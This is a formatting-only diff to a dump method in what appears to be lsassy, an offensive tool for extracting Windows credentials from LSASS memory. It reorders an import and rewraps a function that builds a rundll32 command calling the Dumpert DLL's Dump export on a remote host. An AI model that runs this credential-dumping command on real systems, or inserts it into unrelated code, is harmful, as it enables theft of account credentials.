@@ -2,7 +2,7 @@
 https://github.com/outflanknl/Dumpert
 """
 
-from lsassy.dumpmethod import IDumpMethod, Dependency
+from lsassy.dumpmethod import Dependency, IDumpMethod
 
 
 class DumpMethod(IDumpMethod):
@@ -24,9 +24,8 @@ class DumpMethod(IDumpMethod):
         self.clean_dependencies([self.dumpertdll])
 
     def get_commands(self):
-        cmd_command = """rundll32.exe {},Dump""".format(self.dumpertdll.get_remote_path())
+        cmd_command = """rundll32.exe {},Dump""".format(
+            self.dumpertdll.get_remote_path()
+        )
         pwsh_command = cmd_command
-        return {
-            "cmd": cmd_command,
-            "pwsh": pwsh_command
-        }
+        return {"cmd": cmd_command, "pwsh": pwsh_command}
